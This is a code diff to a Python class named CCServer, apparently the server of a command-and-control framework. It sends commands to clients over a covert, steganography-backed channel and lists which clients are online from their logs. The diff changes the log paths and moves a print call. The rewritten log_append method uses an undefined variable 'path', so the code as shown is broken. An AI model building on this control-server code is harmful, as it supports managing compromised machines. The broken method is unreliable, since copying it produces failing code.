@@ -14,14 +14,15 @@ class CCServer(object):
     def __init__(self, ccchanel: CCChanelBase, steno_: CCStenoBase):
         self.ccchanel = ccchanel
         self.steno_base = steno_
-        self.log_root = '/tmp'
-        self.download_dir = '/tmp'
+        self.log_root = '/tmp/ccsuite'
+        self.download_dir = '/tmp/ccsuite'
 
     def log_append(self, client_id, payload):
-        return cclog_append(self.ccchanel, self.log_root + client_id, payload, self.steno_base)
+        return cclog_append(self.ccchanel, path, payload, self.steno_base)
 
     def log_read(self, client_id):
-        return cclog_read(self.ccchanel, self.log_root + client_id, self.steno_base)
+        path = os.path.join(self.log_root, client_id)
+        return cclog_read(self.ccchanel, path, self.steno_base)
 
     def dispatch_command(self, path, command, *args):
         payload = scmd.command_create(command, *args)
@@ -41,12 +42,12 @@ class CCServer(object):
             case 'cat':
                 log = self.log_read(args[0])
                 print(f"SERVER: cating {args[0]}")
-                print(log)
             case 'online':
                 file_list = self.ccchanel.list(self.log_root)
                 hosts = []
                 for client_id in file_list:
                     log = self.log_read(client_id)
+                    print(log)
                     if log is not None and sutil.is_online(log):
                         hosts.append(client_id)
                 print(f"SERVER: listing online clients")
